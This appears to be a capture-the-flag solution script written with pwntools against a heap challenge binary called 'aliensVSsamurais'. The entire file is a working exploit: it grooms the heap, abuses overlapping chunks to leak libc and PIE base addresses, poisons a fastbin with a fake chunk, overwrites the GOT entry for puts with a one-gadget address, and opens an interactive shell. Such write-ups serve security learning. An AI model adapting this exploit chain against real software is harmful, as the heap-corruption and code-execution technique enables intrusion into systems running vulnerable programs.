from __future__ import print_function
from pwn import *

target = process("./aliensVSsamurais", env={"LD_PRELOAD":"./libc-2.23.so"})
#gdb.attach(target)

elf = ELF('aliensVSsamurais')
libc = ELF('libc-2.23.so')

def goToHatchery():
	target.sendline("3")

def makeAlien(size, content, newline=None):
	print(target.recvuntil("Brood mother, what tasks do we have today."))
	target.sendline("1")
	print(target.recvuntil("How long is my name?"))
	target.sendline(str(size))
	print(target.recvuntil("What is my name?"))
	if newline == None:
		target.sendline(content)
	else:
		target.send(content)
def killAlien(index):
	print(target.recvuntil("Brood mother, what tasks do we have today."))
	target.sendline("2")
	print(target.recvuntil("Which alien is unsatisfactory, brood mother?"))
	target.sendline(str(index))

def editAlien(index, content, leak = None):
	print(target.recvuntil("Brood mother, what tasks do we have today."))
	target.sendline("3")
	print(target.recvuntil("Brood mother, which one of my babies would you like to rename?"))
	target.sendline(str(index))
	print(target.recvuntil("Oh great what would you like to rename "))

	if leak != None:
		leak = target.recvline()
		leak = leak.replace(" to?\n", "")
		leak = u64(leak + "\x00"*(8-len(leak)))
		print("leak is: " + hex(leak))
		target.send(p64(leak)[:6])
	else:
		target.sendline(content)

	return leak


goToHatchery()



# Get that free bin edit / libc infoleak

# First groom the heap for alignment
makeAlien(0x20, 'pineapple')# 0
makeAlien(0x20, 'pineapple')# 1
makeAlien(0x20, 'pineapple')# 2
makeAlien(0x20, 'pineapple')# 3

killAlien(0)
killAlien(1)
killAlien(2)
killAlien(3)

makeAlien(0xf0, "0"*8)# 4
makeAlien(0x60, "1"*8)# 5
makeAlien(0xf0, "2"*8)# 6
makeAlien(0x10, "3"*8)# 7

killAlien(4)
killAlien(5)

# This chunk is the one that will overlap with the unsorted bin
makeAlien(0x68, "4"*0x60 + p64(0x170))# 8

killAlien(6)

makeAlien(0xf0, '4'*8)# 9

# Leak libc
leak = editAlien(8, "0000000", 1)
libcBase = leak - 0x3c4b78
freeHook = libcBase + libc.symbols['__malloc_hook'] - 0x13



# Leak pie
x = editAlien(-10, "0", 1)
pieBase = x - 0x202070

fakeChunk = pieBase + 0x20208d

print("Pie Base: " + hex(pieBase))
print("Libc Base: " + hex(libcBase))
print("Fake Chun: " + hex(fakeChunk))



# This chunk overlaps with chunk 8
makeAlien(0x60, '5'*8)# 10

# Add chunk 10 to the fast bin
killAlien(10)

# Edit fastbin chunk, add our fake chunk to the fast bin
editAlien(8, p64(fakeChunk))

# Move our fake chunk up to the top of the fast bin
makeAlien(0x60, '8'*8)# 13

# Write the pointers for the got overwrite
makeAlien(0x60, '159' + p64(fakeChunk + 3 + 0x18) + p64(pieBase + elf.got['puts'])[:6], 1)# 14



# Execute the got overwrite
editAlien(-4, p64(libcBase + 0x45216))

# Enjoy your shell!
target.interactive()

